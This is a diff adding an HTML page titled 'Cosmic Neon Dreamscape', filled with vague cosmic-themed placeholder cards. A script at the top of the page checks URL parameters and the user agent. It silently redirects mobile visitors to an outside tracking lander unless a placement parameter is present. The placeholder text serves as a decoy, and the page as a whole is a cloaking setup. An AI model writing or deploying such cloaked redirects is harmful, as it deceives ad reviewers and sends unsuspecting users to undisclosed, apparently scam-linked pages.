@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/dade2563-43ce-4351-9ba3-22961c539221?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Neon Dreamscape</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 40px;
+            flex-grow: 1;
+        }
+        .card {
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        .card:hover {
+            transform: scale(1.05);
+        }
+        footer {
+            background-color: rgba(0, 0, 0, 0.7);
+            text-align: center;
+            padding: 10px;
+            margin-top: auto;
+        }
+        a {
+            color: #00ff00;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cosmic Neon Dreamscape</h1>
+    </header>
+    <main>
+        <div class="card">
+            <h2>Nebula Whispers</h2>
+            <p>Listen to the cosmic secrets hidden in the stars.</p>
+        </div>
+        <div class="card">
+            <h2>Quantum Leaps</h2>
+            <p>Explore the multiverse with our reality-bending technology.</p>
+        </div>
+        <div class="card">
+            <h2>Neon Pulse</h2>
+            <p>Feel the rhythm of the cybernetic heartbeat.</p>
+        </div>
+        <div class="card">
+            <h2>Astral Projection</h2>
+            <p>Unlock the secrets of out-of-body experiences.</p>
+        </div>
+        <div class="card">
+            <h2>Digital Dreams</h2>
+            <p>Dive into a world where imagination becomes reality.</p>
+        </div>
+        <div class="card">
+            <h2>Holographic Memories</h2>
+            <p>Preserve your experiences in stunning 3D detail.</p>
+        </div>
+    </main>
+    <footer>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
